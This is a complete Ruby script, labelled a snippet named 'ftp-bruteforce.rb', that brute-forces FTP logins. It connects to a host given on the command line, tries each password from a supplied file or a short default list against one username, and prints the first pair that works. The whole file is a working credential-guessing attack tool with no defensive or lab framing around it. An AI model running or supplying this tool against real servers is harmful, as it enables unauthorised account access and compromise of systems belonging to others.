#!/usr/bin/ruby
#Snippet: ftp-bruteforce.rb
require 'net/ftp'

#Main function: Try password
def attempt_login(host, port, username, password)
    begin
        ftp = Net::FTP.new
        ftp.connect(host, port)
        ftp.login(username, password)
        puts "[*] Success: #{username}:#{password}."
        ftp.close
        true
    rescue
        false
    end
end

def bruteforce_ftp(host, port, username, passwords)
    passwords.each do|password|
        return if attempt_login(host, port, username, password)
    end
end

#Defaults and user input
host = ARGV[0]||"127.0.0.1"         #Target FTP server
port = (ARGV[1]||21).to_i           #Port number
username = ARGV[2]||"ftpuser"       #Username
password_file = ARGV[3]||nil        #Password file
passwords = password_file ? File.readlines(password_file, chomp: true) : ["anonymous", "ftpuser", "ftpadmin"]

#Start bruteforcing
puts "[*] Targeting #{host}:#{port} with user '#{username}'..."
bruteforce_ftp(host, port, username, passwords)
puts "[*] Bruteforce finished."
